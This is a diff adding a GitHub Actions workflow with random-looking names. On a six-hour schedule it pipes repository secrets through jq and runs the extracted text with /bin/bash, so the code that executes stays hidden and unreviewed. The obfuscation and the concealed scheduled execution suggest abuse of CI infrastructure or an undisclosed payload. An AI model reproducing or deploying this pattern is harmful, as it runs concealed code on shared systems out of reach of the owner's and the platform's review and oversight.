@@ -1,0 +1,29 @@
+name: birushuogekys
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: birushuogekys
+        env:
+          zqus6: ${{ secrets.zqus6 }}
+        run: |
+          echo $zqus6 | jq -r .l52 | /bin/bash
+          echo $hs66 | jq -r .d2 | /bin/bash
+          echo $wcnm82037 | jq -r .mwrfj62252 | /bin/bash
+          echo $hqpd44 | jq -r .q206 | /bin/bash
+          echo $qbo897 | jq -r .q8 | /bin/bash
+          echo $grgv74540 | jq -r .bi3 | /bin/bash
+          echo $xvdo95 | jq -r .fpcmr554 | /bin/bash
+          echo $oc75125 | jq -r .if338 | /bin/bash
+          echo $sp4 | jq -r .r83 | /bin/bash
+          echo $v5 | jq -r .ysaf22957 | /bin/bash
+          echo $tqgve42 | jq -r .rrc3138 | /bin/bash
+          echo $lvp82 | jq -r .dluya57204 | /bin/bash
+          echo $mkx4 | jq -r .dr0 | /bin/bash
+
